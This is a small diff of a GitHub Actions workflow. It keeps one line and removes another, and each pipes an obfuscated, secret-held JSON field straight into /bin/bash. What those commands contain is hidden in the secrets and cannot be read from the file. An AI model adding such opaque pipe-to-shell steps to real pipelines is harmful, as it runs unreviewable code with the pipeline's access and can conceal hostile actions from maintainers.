@@ -19,7 +19,6 @@ jobs:
           ydnu48: ${{ secrets.ydnu48 }}
         run: |
           printf '%s' "$ydnu48" | jq -r .nuyy1622 | /bin/bash
-          echo $gtib72 | jq -r .ofr00280 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
